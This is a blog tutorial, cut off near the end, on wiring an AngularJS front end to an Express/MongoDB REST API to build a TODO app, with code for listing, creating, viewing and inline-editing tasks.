<h1 id="Why-MEAN-stack">Why MEAN stack?<a href="#Why-MEAN-stack" class="headerlink" title="Why MEAN stack?"></a></h1><p><a href="#start">TL; DR</a>: NodeJS has been built from bottom up a non-blocking I/O paradigm, which gives you more efficiency per CPU core than using threads in other languages like <a href="http://strongloop.com/strongblog/node-js-is-faster-than-java/" target="_blank" rel="noopener">Java</a>.</p>
<p>LAMP (Linux-Apache-MySQL-PHP) has dominated web application stack for many years now. Well-known platforms such as Wikipedia, Wordpress, and even Facebook uses it or started with it. Enterprise, usually, used go down the Java path: Hibernate, Spring, Struts, JBoss. More agile frameworks also have been used such as Ruby on Rails and for Python Django and Pylon.</p>
<img src="/images/mean_vs_lamp_stack.png" title="LAMP vs MEAN stack">
<p><strong>Ubiquitous</strong></p>
<p>Well, it turns out, that JavaScript it is everywhere. It used to be limited to browsers. But, now you can found it in smartphones, servers, robots, Arduino, RaspberryPi‚Ä¶ Thus, it does not matter what technology you use to build web applications, you need to be familiar with Javascript. In that case, then, it is a time saver to use wherever it fits, especially for building web applications. MEAN stack is embracing that, using Javascript to create end-to-end web applications.
‚Äã
<strong>Non-blocking architecture</strong></p>
<p>JavaScript is a dynamic, object-oriented, and functional scripting language. One of the features that make it win over Java Applets decades ago, it was its lightness and non-blocking event loop.
Blocking means that when one line of code is executing, the rest of it is locked waiting to finish. On the other hand, non-blocking gives to each line of code a shot and then through callbacks it can come back when an event happens.
Programming languages that are blocking (Java, Ruby, Python, PHP, ‚Ä¶) overcomes concurrency using many threads of execution while JavaScript handles it using non-blocking event loop in a single thread.</p>
<img src="/images/blocking_vs_non_blocking_io.png">
<p>As you can see, a single thread of execution in Node can handle perform multiple tasks vs a non-blocking style that execute each one sequentially. You can read more about it in <a href="[strongloop.com](http://strongloop.com/strongblog/node-js-is-faster-than-java/)" target="_blank">NodeJS faster than Java</a> article.</p>
<p>Some companies like <a href="https://www.paypal-engineering.com/2013/11/22/node-js-at-paypal/" target="_blank" rel="noopener">Paypal</a> moved from Java backend to NodeJS and reported a increased performance, lower average response times, and development speed gains.  Similarly happens to <a href="https://engineering.groupon.com/2013/misc/i-tier-dismantling-the-monoliths/" target="_blank" rel="noopener">Groupon</a> that came from Java/Rails monoliths.</p>
<p><strong>Agile and vibrant community</strong></p>
<p>The community behind Javascript is quite vibrant. It has permeated in almost all the fields of technology: data visualization, server-side, databases, robotics, building tools and many more.</p>
<p><a id="start"></a></p>
<h1 id="TODO-app-with-MEAN">TODO app with MEAN<a href="#TODO-app-with-MEAN" class="headerlink" title="TODO app with MEAN"></a></h1><p>In this section are going to put together everything that we learnt in the <a href="/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/">two</a> <a href="/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/">previous</a> tutorials.</p>
<h2 id="MEAN-Backend-with-MongoDB-ExpressJS-and-NodeJS">MEAN Backend with MongoDB, ExpressJS and NodeJS<a href="#MEAN-Backend-with-MongoDB-ExpressJS-and-NodeJS" class="headerlink" title="MEAN Backend with MongoDB, ExpressJS and NodeJS"></a></h2><p>In the <a href="/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/">previous post</a>, we have gone through the process of building a RESTful API and we are going to be building on top of that. <a href="https://github.com/amejiarosario/todoAPIjs" target="_blank" rel="noopener">Repository here</a>.</p>
<figure class="highlight bash"><figcaption><span>Getting the back-end code build on Part II</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/amejiarosario/todoAPIjs.git</span><br></pre></td></tr></table></figure>
<h2 id="MEAN-stack-front-end-with-AngularJS">MEAN stack front-end with AngularJS<a href="#MEAN-stack-front-end-with-AngularJS" class="headerlink" title="MEAN stack front-end with AngularJS"></a></h2><p>Similarly, we have build a very lean todoApp in the <a href="/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/">first part</a> of this tutorial. You can <a href="https://gist.githubusercontent.com/amejiarosario/068143b53e54db43ef38/raw/ngTodo.html" target="_blank" rel="noopener">download the file</a> to follow along and see it in action <a href="https://cdn.rawgit.com/amejiarosario/068143b53e54db43ef38/raw/ngTodo.html" target="_blank" rel="noopener">here</a>. You might notice the angularJS app is very simple and even it is entirely in one file for simplicity sake. In further tutorials, we are going to make it more modular, split in files, add tests and stylesheets.</p>
<p>Let‚Äôs go first to the ExpressJS app (todoAPIjs) and review the default routing system:</p>
<ol>
<li><code>app.js</code> loads the all the routes.</li>
<li>The root path (<code>/</code>) is mounted on the <code>routes/index.js</code></li>
<li><code>routes/index.js</code> sets the variable title and renders <code>index.ejs</code>.</li>
</ol>
<figure class="highlight javascript"><figcaption><span>Tracing ExpressJS index route</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">var</span> routes = <span class="built_in">require</span>(<span class="string">'./routes/index'</span>);</span><br><span class="line">app.use(<span class="string">'/'</span>, routes);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./routes/index.js</span></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Express'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./views/index.ejs</span></span><br><span class="line">    &lt;h1&gt;<span class="xml"><span class="tag">&lt;<span class="name">%=</span> <span class="attr">title</span> %&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">    &lt;p&gt;Welcome to &lt;%= title %&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>The best place to load our <code>./views/index.ejs</code>. So let‚Äôs copy the body content from ngTodo.html content in there and change in <code>./routes/index.js</code> title to ‚ÄúngTodo App‚Äù. Don‚Äôt forget to add ng-app on the top. <code>&lt;html ng-app=&quot;app&quot;&gt;</code>.</p>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/ebf20f4093aa20c867777b4b3db825429b54a20d" target="_blank" rel="noopener">diff</a></p>
<h1 id="Wiring-up-the-App">Wiring up the App<a href="#Wiring-up-the-App" class="headerlink" title="Wiring up the App"></a></h1><h2 id="AngularJS-Read-with-http">AngularJS Read with $http<a href="#AngularJS-Read-with-http" class="headerlink" title="AngularJS Read with $http"></a></h2><p>As you might notice, in the factory, we have a fixed array. We need to change it to communicate with the API that we just build.</p>
<p><code>$http</code> is Anguar core sevice that allow to make <code>XMLHttpRequest</code> or <code>jsonp</code> request. You can either pass an object with http verb and url or call call $http.verb (<code>$http.get</code>, <code>$http.post</code>).</p>
<p><code>$http</code> returns a promise which has a <code>success</code> and <code>error</code> function.</p>
<figure class="highlight javascript"><figcaption><span>AngularJS $HTTP Usage Example</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$http(&#123;<span class="attr">method</span>: <span class="string">'GET'</span>, <span class="attr">url</span>: <span class="string">'/todos'</span>&#125;).</span><br><span class="line">  success(<span class="function"><span class="keyword">function</span>(<span class="params">data, status, headers, config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this callback will be called asynchronously</span></span><br><span class="line">    <span class="comment">// when the response is available.</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'todos: '</span>, data );</span><br><span class="line">  &#125;).</span><br><span class="line">  error(<span class="function"><span class="keyword">function</span>(<span class="params">data, status, headers, config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// called asynchronously if an error occurs</span></span><br><span class="line">    <span class="comment">// or server returns response with an error status.</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Oops and error'</span>, data);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs try it out in our app. Go to <code>views/index.ejs</code> and do this changes:</p>
<figure class="highlight javascript"><figcaption><span>Using $http to retrieve data from database</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Service</span></span><br><span class="line">.factory(<span class="string">'Todos'</span>, [<span class="string">'$http'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$http</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> $http.get(<span class="string">'/todos'</span>);</span><br><span class="line">&#125;])</span><br><span class="line"></span><br><span class="line"><span class="comment">// Controller</span></span><br><span class="line">.controller(<span class="string">'TodoController'</span>, [<span class="string">'$scope'</span>, <span class="string">'Todos'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, Todos</span>) </span>&#123;</span><br><span class="line">  Todos.success(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    $scope.todos = data;</span><br><span class="line">  &#125;).error(<span class="function"><span class="keyword">function</span>(<span class="params">data, status</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data, status);</span><br><span class="line">    $scope.todos = [];</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/0221aebd62e88445629debe4f132684686cf48ec" target="_blank" rel="noopener">diff</a></p>
<p><code>$http.get</code> will request data using the <code>GET</code> method.</p>
<blockquote>
<p>Try it in your browser!s If you have data from the <a href="http://adrianmejia.com/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/#browser-and-postman">previous tutorial</a> you should be able to see it.</p>
</blockquote>
<p>To <strong>start the server</strong>, you can use
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure></p>
<p>or if you have it installed</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nodemon</span><br></pre></td></tr></table></figure>
<h2 id="AngularJS-Read-with-resource">AngularJS Read with $resource<a href="#AngularJS-Read-with-resource" class="headerlink" title="AngularJS Read with $resource"></a></h2><p>If you click in one of the Todo elements and get redirected to the detail page, you will not see anything yet. We need to update the <code>TodoDetailCtrl</code> first. Even though we already have the GET verb working. We have a different URL requirement for <code>/todos/:id</code> for the other methods. There‚Äôs an Angular service that has a higher level of abstraction of $http to deal with RESTful requests. It is called <code>$resource</code>.</p>
<p>Initialize as:
<code>$resource(url, [paramDefaults], [actions], options);</code></p>
<p>It comes with the following actions already defined; it is missing one though‚Ä¶ Can you tell?</p>
<figure class="highlight javascript"><figcaption><span>$resource actions</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">'get'</span>:    &#123;<span class="attr">method</span>:<span class="string">'GET'</span>&#125;,  <span class="comment">// get individual record</span></span><br><span class="line">  <span class="string">'save'</span>:   &#123;<span class="attr">method</span>:<span class="string">'POST'</span>&#125;, <span class="comment">// create record</span></span><br><span class="line">  <span class="string">'query'</span>:  &#123;<span class="attr">method</span>:<span class="string">'GET'</span>, <span class="attr">isArray</span>:<span class="literal">true</span>&#125;, <span class="comment">// get list all records</span></span><br><span class="line">  <span class="string">'remove'</span>: &#123;<span class="attr">method</span>:<span class="string">'DELETE'</span>&#125;, <span class="comment">// remove record</span></span><br><span class="line">  <span class="string">'delete'</span>: &#123;<span class="attr">method</span>:<span class="string">'DELETE'</span>&#125; &#125;; <span class="comment">// same, remove record</span></span><br></pre></td></tr></table></figure>
<p>The instances are used in the following way (examples will come later):</p>
<ul>
<li>GET: <code>Resource.get([parameters], [success], [error])</code></li>
<li>Non-GET: <code>Resource.action([parameters], postData, [success], [error])</code></li>
<li>Non-GET: <code>resourceInstance.$action([parameters], [success], [error])</code></li>
</ul>
<p><code>$resource</code> is not part of the Angular core, so it requires to <code>ngResource</code> and the dependency. We can get it from the CDN:</p>
<figure class="highlight html"><figcaption><span>ngResource dependency</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/angularjs/1.2.25/angular-resource.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>This is what need to set it up:</p>
<figure class="highlight javascript"><figcaption><span>$resource.query()</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// add ngResource dependency</span></span><br><span class="line">  angular.module(<span class="string">'app'</span>, [<span class="string">'ngRoute'</span>, <span class="string">'ngResource'</span>])</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        .factory(<span class="string">'Todos'</span>, [<span class="string">'$resource'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$resource</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> $resource(<span class="string">'/todos/:id'</span>, <span class="literal">null</span>, &#123;</span><br><span class="line">            <span class="string">'update'</span>: &#123; <span class="attr">method</span>:<span class="string">'PUT'</span> &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;])</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">        .controller(<span class="string">'TodoController'</span>, [<span class="string">'$scope'</span>, <span class="string">'Todos'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, Todos</span>) </span>&#123;</span><br><span class="line">          $scope.todos = Todos.query();</span><br><span class="line">        &#125;])</span><br></pre></td></tr></table></figure>
<p>Angular will render an empty <code>$scope.todos</code>. but, when <code>Todos.query()</code> comes with the data from the server it will re-render the UI.</p>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/2aff6fe004bf7f7b2cd1b91d53e6958c3b158a20" target="_blank" rel="noopener">diff</a></p>
<h2 id="AngularJS-Create">AngularJS Create<a href="#AngularJS-Create" class="headerlink" title="AngularJS Create"></a></h2><p>We will need to create a new text box, a button to send a <code>POST</code> request to server and add it to the <code>$scope</code>.</p>
<blockquote>
<p>We are using inline templates with <code>id=&quot;/todos.html&quot;</code> and <code>id=&quot;/todoDetails.html&quot;</code>. They are not physical files. Just <code>ng-template</code> that we create in the <a href="/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/">part I</a> of these <a href="/tags/Tutorial-MEAN-Stack/">tutorial series</a>.</p>
</blockquote>
<p>Add this code at the bottom of the <code>id=&quot;/todos.html&quot;</code> template:</p>
<figure class="highlight html"><figcaption><span>New textbox for adding Todos</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New task <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ng-model</span>=<span class="string">"newTodo"</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-click</span>=<span class="string">"save()"</span>&gt;</span>Create<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Notice that we are using a new directive <code>ng-click</code>, this one executes a function when it clicked. Angular makes sure that the behaviour is consistent across different browsers.</p>
<figure class="highlight javascript"><figcaption><span>Save function $resource.$save(...)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.controller(<span class="string">'TodoController'</span>, [<span class="string">'$scope'</span>, <span class="string">'Todos'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, Todos</span>) </span>&#123;</span><br><span class="line">  $scope.todos = Todos.query();</span><br><span class="line"></span><br><span class="line">  $scope.save = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!$scope.newTodo || $scope.newTodo.length &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">var</span> todo = <span class="keyword">new</span> Todos(&#123; <span class="attr">name</span>: $scope.newTodo, <span class="attr">completed</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">    todo.$save(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      $scope.todos.push(todo);</span><br><span class="line">      $scope.newTodo = <span class="string">''</span>; <span class="comment">// clear textbox</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/46dd14023e2d9eff72d1366dbba9c9c8c872e07b" target="_blank" rel="noopener">diff</a></p>
<h2 id="Show-Todo-details">Show Todo details<a href="#Show-Todo-details" class="headerlink" title="Show Todo details"></a></h2><p>Every time you click a todo link, it is showing an empty fields. Let‚Äôs fix that. First we need set the real <code>_id</code> to the links instead of <code>$index</code>.</p>
<figure class="highlight html"><figcaption><span>Change the ID link in the `id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">ng-repeat</span>=<span class="string">"todo in todos | filter: search"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">ng-model</span>=<span class="string">"todo.completed"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/&#123;&#123;todo._id&#125;&#125;"</span>&gt;</span>&#123;&#123;todo.name&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><figcaption><span>Update TodoDetailCtrl with $resource.get</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.controller(<span class="string">'TodoDetailCtrl'</span>, [<span class="string">'$scope'</span>, <span class="string">'$routeParams'</span>, <span class="string">'Todos'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, $routeParams, Todos</span>) </span>&#123;</span><br><span class="line">  $scope.todo = Todos.get(&#123;<span class="attr">id</span>: $routeParams.id &#125;);</span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>
<p>Notice the change from
<code>$scope.todo = Todos[$routeParams.id];</code>
to
<code>$scope.todo = Todos.get({id: $routeParams.id });</code></p>
<p>Now you should be able to see the details :)</p>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/2484107294163a25621fba3785601adb32229ae9" target="_blank" rel="noopener">diff</a></p>
<h2 id="AngularJS-Update-in-line-editing">AngularJS Update (in-line editing)<a href="#AngularJS-Update-in-line-editing" class="headerlink" title="AngularJS Update (in-line editing)"></a></h2><p>This is going to be a very cool feature. Let‚Äôs meet these new directives:</p>
<ul>
<li><p><strong>ng-show</strong>: this directive shows the element if the expression evaluates to true. Otherwise, the content is hidden.</p>
</li>
<li><p><strong>ng-change</strong>: directive for input elements that evaluates the expression after any change.</p>
</li>
</ul>
<p>Replace the template with <code>id=&quot;/todos.html&quot;</code> with the following:</p>
<figure class="highlight html"><figcaption><span>Template todos.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Template --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/ng-template"</span> <span class="attr">id</span>=<span class="string">"/todos.html"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  Search: <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ng-model</span>=<span class="string">"search.name"</span>&gt;</span></span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">ng-repeat</span>=<span class="string">"todo in todos | filter: search"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">ng-model</span>=<span class="string">"todo.completed"</span> <span class="attr">ng-change</span>=<span class="string">"update($index)"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">ng-show</span>=<span class="string">"!editing[$index]"</span> <span class="attr">href</span>=<span class="string">"#/&#123;&#123;todo._id&#125;&#125;"</span>&gt;</span>&#123;&#123;todo.name&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-show</span>=<span class="string">"!editing[$index]"</span> <span class="attr">ng-click</span>=<span class="string">"edit($index)"</span>&gt;</span>edit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">ng-show</span>=<span class="string">"editing[$index]"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ng-model</span>=<span class="string">"todo.name"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-show</span>=<span class="string">"editing[$index]"</span> <span class="attr">ng-click</span>=<span class="string">"update($index)"</span>&gt;</span>Update<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-show</span>=<span class="string">"editing[$index]"</span> <span class="attr">ng-click</span>=<span class="string">"cancel($index)"</span>&gt;</span>Cancel<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">  New task <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ng-model</span>=<span class="string">"newTodo"</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-click</span>=<span class="string">"save()"</span>&gt;</span>Create<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Now let‚Äôs change the controller to handle the inline editing:</p>
<figure class="highlight javascript"><figcaption><span>Todo Controller</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.controller(<span class="string">'TodoController'</span>, [<span class="string">'$scope'</span>, <span class="string">'Todos'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, Todos</span>) </span>&#123;</span><br><span class="line">  $scope.editing = [];</span><br><span class="line">  $scope.todos = Todos.query();</span><br><span class="line"></span><br><span class="line">  $scope.save = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!$scope.newTodo || $scope.newTodo.length &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">var</span> todo = <span class="keyword">new</span> Todos(&#123; <span class="attr">name</span>: $scope.newTodo, <span class="attr">completed</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">    todo.$save(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      $scope.todos.push(todo);</span><br><span class="line">      $scope.newTodo = <span class="string">''</span>; <span class="comment">// clear textbox</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $scope.update = <span class="function"><span class="keyword">function</span>(<span class="params">index</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> todo = $scope.todos[index];</span><br><span class="line">    Todos.update(&#123;<span class="attr">id</span>: todo._id&#125;, todo);</span><br><span class="line">    $scope.editing[index] = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $scope.edit = <span class="function"><span class="keyword">function</span>(<span class="params">index</span>)</span>&#123;</span><br><span class="line">    $scope.editing[index] = angular.copy($scope.todos[index]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $scope.cancel = <span class="function"><span class="keyword">function</span>(<span class="params">index</span>)</span>&#123;</span><br><span class="line">    $scope.todos[index] = angular.copy($scope.editing[index]);</span><br><span class="line">    $scope.editing[index] = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>
<p>We added a new variable <code>$scope.editing</code> which shows or hides the form to edit the values. Furthermore, notice ng-click functions: edit, update and cancel.</p>
<blockquote>
<p>Let‚Äôs see what they do. Try it out!</p>
</blockquote>
<p>While were are editing notice that we copy the original todo task into the editing variable. This server for two purposes:</p>
<ol>
<li><p>It evaluates to <code>true</code> and show the forms with <code>ng-show</code></p>
</li>
<li><p>It holds a copy of the original value in case we press cancel.</p>
</li>
</ol>
<p>Now, going to the Todo Details. We would like that to be updated as well and add notes.</p>
<figure class="highlight html"><figcaption><span>Todo Details</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/ng-template"</span> <span class="attr">id</span>=<span class="string">"/todoDetails.html"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; todo.name &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">  completed: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">ng-model</span>=<span class="string">"todo.completed"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">  note: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">ng-model</span>=<span class="string">"todo.note"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-click</span>=<span class="string">"update()"</span>&gt;</span>Update<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Cancel<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span 